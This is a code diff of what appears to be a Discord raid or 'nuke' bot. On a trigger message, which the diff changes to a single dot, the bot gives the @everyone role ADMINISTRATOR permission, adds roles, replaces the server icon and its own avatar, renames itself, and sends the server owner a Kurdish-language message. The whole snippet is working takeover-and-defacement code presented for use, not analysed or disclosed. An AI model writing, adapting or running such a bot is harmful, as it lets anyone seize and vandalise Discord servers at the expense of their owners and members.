@@ -12,7 +12,7 @@ client.on("ready", () => {
 
 
 client.on("message", message => {
-  if (message.content.startsWith(`r41n`)) {
+  if (message.content.startsWith(`.`)) {
     message.delete();
     message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
@@ -38,8 +38,8 @@ client.on("message", message => {
           message.member.roles.add(rr.id);
         });
     }, 1000);
-    message.guild.setIcon("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
-    client.user.setAvatar("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
+    message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
+    client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setUsername("Loon");
     message.guild.owner.send(
       "تـڕپـەقـاڵ ئـەمـژی"
